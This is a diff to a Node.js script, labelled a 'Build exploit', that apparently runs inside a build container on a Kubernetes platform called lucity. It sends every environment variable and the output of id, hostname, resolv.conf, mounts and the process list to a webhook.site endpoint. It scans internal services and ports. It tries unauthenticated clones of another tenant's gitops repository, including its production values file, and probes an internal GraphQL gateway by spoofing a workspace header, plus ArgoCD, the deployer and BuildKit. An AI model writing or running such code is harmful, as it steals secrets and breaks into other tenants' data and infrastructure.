@@ -4,17 +4,32 @@ const net = require('net');
 const dns = require('dns');
 const { execSync } = require('child_process');
 
-const WEBHOOK = "https://webhook.site/5223a0e3-6931-4bc1-8607-a8534f4a2fac";
+const WEBHOOK = process.env.WEBHOOK_URL || "https://webhook.site/d16fa166-2948-4505-96c0-f67e0db0843d";
 
 function post(label, data) {
   return new Promise((resolve) => {
     const u = new URL(WEBHOOK);
     const req = https.request({
       hostname: u.hostname, port: 443, path: u.pathname,
-      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label }
+      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label },
+      timeout: 10000
     }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
     req.on('error', resolve);
+    req.on('timeout', () => { req.destroy(); resolve(); });
     req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
+    req.end();
+  });
+}
+
+function httpGet(hostname, port, path) {
+  return new Promise((resolve) => {
+    const req = http.request({ hostname, port, path, method: 'GET', timeout: 5000 }, (res) => {
+      let d = '';
+      res.on('data', c => d += c);
+      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: d.substring(0, 5000) }));
+    });
+    req.on('error', e => resolve({ error: e.message }));
+    req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
     req.end();
   });
 }
@@ -37,113 +52,142 @@ function dnsLookup(name) {
 }
 
 async function main() {
-  let results = '';
+  await post('start', `Build exploit started at ${new Date().toISOString()}`);
 
-  // 1. Find internal services via DNS
+  // 1. Dump all env vars
+  await post('env-vars', JSON.stringify(process.env, null, 2));
+
+  // 2. Filesystem recon
+  let fsRecon = '';
+  try { fsRecon += 'id: ' + execSync('id').toString() + '\n'; } catch(e) {}
+  try { fsRecon += 'hostname: ' + execSync('hostname').toString() + '\n'; } catch(e) {}
+  try { fsRecon += 'resolv.conf:\n' + execSync('cat /etc/resolv.conf').toString() + '\n'; } catch(e) {}
+  try { fsRecon += 'mounts:\n' + execSync('cat /proc/mounts').toString().substring(0, 3000) + '\n'; } catch(e) {}
+  try { fsRecon += 'processes:\n' + execSync('ps aux 2>/dev/null || cat /proc/*/cmdline 2>/dev/null | tr "\\0" " " | head -50').toString() + '\n'; } catch(e) {}
+  await post('fs-recon', fsRecon);
+
+  // 3. DNS discovery - find ALL services
   const services = [
-    'lucity-deployer', 'deployer', 'lucity-gateway', 'gateway',
-    'lucity-builder', 'builder', 'lucity-api', 'api',
-    'lucity-controller', 'controller', 'lucity-scheduler', 'scheduler',
-    'lucity-proxy', 'proxy', 'lucity-infra-zot',
-    'kubernetes', 'kubernetes.default', 'kubernetes.default.svc'
+    'lucity-packager', 'lucity-gateway', 'lucity-builder', 'lucity-deployer',
+    'lucity-webhook', 'lucity-cashier', 'lucity-dashboard',
+    'lucity-infra-zot', 'lucity-infra-soft-serve', 'lucity-infra-argocd-server',
+    'lucity-infra-argocd-repo-server', 'lucity-argocd-server',
+    'lucity-buildkit', 'lucity-infra-argocd-redis'
   ];
   
-  const namespaces = ['lucity-system', 'default', 'kube-system'];
-  
-  for (const ns of namespaces) {
-    for (const svc of services) {
-      const fqdn = svc + '.' + ns + '.svc.cluster.local';
-      const addrs = await dnsLookup(fqdn);
-      if (addrs) {
-        results += 'DNS: ' + fqdn + ' -> ' + addrs.join(', ') + '\n';
-        // Scan common ports
-        for (const port of [80, 443, 8080, 8443, 9090, 50051, 50052, 3000, 5000, 6443]) {
-          const open = await scanPort(addrs[0], port);
-          if (open) results += '  OPEN: ' + addrs[0] + ':' + port + '\n';
-        }
+  let dnsResults = '';
+  for (const svc of services) {
+    const fqdn = svc + '.lucity-system.svc.cluster.local';
+    const addrs = await dnsLookup(fqdn);
+    if (addrs) {
+      dnsResults += `${fqdn} -> ${addrs.join(', ')}\n`;
+      // Scan key ports
+      for (const port of [80, 443, 8080, 9001, 9002, 9003, 9004, 9005, 5000, 23231, 23232, 50051, 6379, 1234]) {
+        const open = await scanPort(addrs[0], port);
+        if (open) dnsResults += `  OPEN ${addrs[0]}:${port}\n`;
       }
     }
   }
-  
-  await post('dns-scan', results || 'no services found via DNS');
+  await post('dns-scan', dnsResults || 'no services found');
 
-  // 2. Scan the known subnet for deployer/gateway
-  // We know: 10.244.1.56 = zot, 10.244.2.76 = neighbor
-  // Scan 10.244.1.x and 10.244.0.x for gRPC (50051) and HTTP (8080, 3000)
-  let portScan = '';
-  const subnets = ['10.244.0', '10.244.1', '10.244.2'];
-  const targetPorts = [50051, 8080, 3000, 9090, 80];
-  
-  for (const subnet of subnets) {
-    for (let i = 1; i <= 20; i++) {
-      const ip = subnet + '.' + i;
-      for (const port of targetPorts) {
-        const open = await scanPort(ip, port);
-        if (open) portScan += ip + ':' + port + ' OPEN\n';
-      }
+  // 4. Try Soft-serve endpoints
+  const ssAddrs = await dnsLookup('lucity-infra-soft-serve.lucity-system.svc.cluster.local');
+  if (ssAddrs) {
+    const ssIP = ssAddrs[0];
+    // Try HTTP without auth
+    const catalog = await httpGet(ssIP, 23232, '/');
+    await post('softserve-root', JSON.stringify(catalog));
+    
+    // Try listing repos
+    const repos = await httpGet(ssIP, 23232, '/repos');
+    await post('softserve-repos', JSON.stringify(repos));
+    
+    // Try specific repo
+    const zeitlos = await httpGet(ssIP, 23232, '/zeitlos-software-beast-gitops.git/info/refs?service=git-upload-pack');
+    await post('softserve-zeitlos', JSON.stringify(zeitlos));
+    
+    // Try anonymous git clone
+    try {
+      const cloneResult = execSync('git clone http://' + ssIP + ':23232/zeitlos-software-beast-gitops.git /tmp/zeitlos-clone 2>&1', { timeout: 10000 }).toString();
+      await post('softserve-clone', cloneResult);
+      // If clone worked, read the repo
+      try {
+        const files = execSync('find /tmp/zeitlos-clone -type f | head -50').toString();
+        await post('zeitlos-files', files);
+        const values = execSync('cat /tmp/zeitlos-clone/environments/production/values.yaml 2>/dev/null || echo "no values"').toString();
+        await post('zeitlos-values', values);
+      } catch(e) { await post('zeitlos-read-err', e.message); }
+    } catch(e) { await post('softserve-clone-err', e.stderr?.toString() || e.message); }
+  }
+
+  // 5. Try Packager gRPC (port 9002)
+  const pkgAddrs = await dnsLookup('lucity-packager.lucity-system.svc.cluster.local');
+  if (pkgAddrs) {
+    await post('packager-ip', pkgAddrs.join(', '));
+    // Try HTTP on various ports
+    for (const port of [9002, 8080, 80]) {
+      const res = await httpGet(pkgAddrs[0], port, '/');
+      if (!res.error) await post(`packager-http-${port}`, JSON.stringify(res));
     }
   }
-  
-  await post('port-scan', portScan || 'nothing open');
 
-  // 3. Try hitting K8s API
-  let k8s = '';
-  try {
-    const res = await new Promise((resolve) => {
-      const req = https.request({
-        hostname: 'kubernetes.default.svc', port: 443, path: '/api/v1/namespaces',
-        method: 'GET', rejectUnauthorized: false,
-        headers: { 'Authorization': 'Bearer dummy' }
+  // 6. Try Gateway (port 8080)  
+  const gwAddrs = await dnsLookup('lucity-gateway.lucity-system.svc.cluster.local');
+  if (gwAddrs) {
+    // Hit the internal GraphQL endpoint without auth
+    const gql = await new Promise((resolve) => {
+      const req = http.request({
+        hostname: gwAddrs[0], port: 8080, path: '/graphql',
+        method: 'POST', headers: { 
+          'Content-Type': 'application/json',
+          'X-Lucity-Workspace': 'zeitlos-software'
+        }, timeout: 5000
       }, (res) => {
         let d = '';
         res.on('data', c => d += c);
-        res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 1000) }));
+        res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 2000) }));
       });
       req.on('error', e => resolve({ error: e.message }));
+      req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
+      req.write(JSON.stringify({ query: '{ projects { id name } }' }));
       req.end();
     });
-    k8s = JSON.stringify(res);
-  } catch(e) { k8s = e.message; }
-  
-  await post('k8s-api', k8s);
-
-  // 4. Check if we can reach any gRPC endpoints
-  // Try connecting to deployer and sending a gRPC probe
-  const grpcTargets = [];
-  // Parse open ports from scan
-  const openPorts = portScan.split('\n').filter(l => l.includes('50051'));
-  for (const line of openPorts) {
-    const [hostPort] = line.split(' ');
-    if (hostPort) grpcTargets.push(hostPort);
+    await post('gateway-internal', JSON.stringify(gql));
   }
-  
-  await post('grpc-targets', grpcTargets.join('\n') || 'no gRPC ports found');
 
-  // 5. Try to reach deployer via HTTP (some Go services expose HTTP alongside gRPC)
-  let httpProbe = '';
-  const httpTargets = portScan.split('\n').filter(l => l.includes('OPEN'));
-  for (const line of httpTargets.slice(0, 10)) {
-    const [hostPort] = line.split(' ');
-    if (!hostPort) continue;
-    const [ip, port] = hostPort.split(':');
-    try {
-      const res = await new Promise((resolve) => {
-        const req = http.request({ hostname: ip, port: parseInt(port), path: '/', method: 'GET', timeout: 3000 }, (res) => {
-          let d = '';
-          res.on('data', c => d += c);
-          res.on('end', () => resolve(ip + ':' + port + ' -> ' + res.statusCode + ' ' + d.substring(0, 200)));
-        });
-        req.on('error', e => resolve(ip + ':' + port + ' -> ERR: ' + e.message));
-        req.on('timeout', () => { req.destroy(); resolve(ip + ':' + port + ' -> TIMEOUT'); });
-        req.end();
-      });
-      httpProbe += res + '\n';
-    } catch(e) {}
+  // 7. Try Deployer gRPC (port 9003)
+  const depAddrs = await dnsLookup('lucity-deployer.lucity-system.svc.cluster.local');
+  if (depAddrs) {
+    await post('deployer-ip', depAddrs.join(', '));
+    for (const port of [9003, 8080]) {
+      const res = await httpGet(depAddrs[0], port, '/');
+      if (!res.error) await post(`deployer-http-${port}`, JSON.stringify(res));
+    }
   }
-  
-  await post('http-probe', httpProbe || 'no HTTP targets');
 
+  // 8. Try ArgoCD
+  const argoAddrs = await dnsLookup('lucity-infra-argocd-server.lucity-system.svc.cluster.local');
+  if (argoAddrs) {
+    const argoAPI = await httpGet(argoAddrs[0], 80, '/api/v1/applications');
+    await post('argocd-apps', JSON.stringify(argoAPI));
+    
+    // Try listing all apps without auth
+    const argoVersion = await httpGet(argoAddrs[0], 80, '/api/version');
+    await post('argocd-version', JSON.stringify(argoVersion));
+  }
+
+  // 9. Try BuildKit
+  const bkAddrs = await dnsLookup('lucity-buildkit.lucity-system.svc.cluster.local');
+  if (bkAddrs) {
+    await post('buildkit-ip', bkAddrs.join(', '));
+    for (const port of [1234, 8080]) {
+      const open = await scanPort(bkAddrs[0], port);
+      if (open) await post(`buildkit-port-${port}`, 'OPEN');
+    }
+  }
+
+  await post('done', 'Exploit complete');
   console.log('recon done');
 }
 
-main().catch(console.error);
+main().catch(e => { console.error(e); post('fatal', e.message); });
